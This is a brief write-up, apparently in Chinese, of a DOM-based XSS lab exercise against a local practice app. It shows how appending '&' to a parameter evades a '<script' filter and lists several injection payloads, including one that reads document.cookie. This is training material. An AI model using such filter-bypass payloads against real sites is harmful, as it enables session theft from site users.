# **DOM Based Cross Site Scripting (XSS)**

> The developer has tried to add a simple pattern matching to remove any references to "<script" to disable any JavaScript. Find a way to run JavaScript without using the script tags.
>

try 了一下，發現加了 `&` 在  English 後面可以逃過檢查，有時候後端過濾變數時會忘記處理重複性或多個變數的狀況，剛好類似目前的情境

```
English&<script>alert(1)</script>
```

```
default=English&<script>alert(1)</script>
```

```
http://localhost:8086/vulnerabilities/xss_d/?default=English&%3Cscript%3Ealert(1)%3C/script%3E
```

```
default=English&<script>alert(document.cookie)</script>
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/685bf785-4bbb-4d54-9ea7-3804330eac06/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T045922Z&X-Amz-Expires=86400&X-Amz-Signature=6aeeb597654785bb324d28ec9bba2deddf24d78de8bf10d5eff2b36dcdeae83d&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)
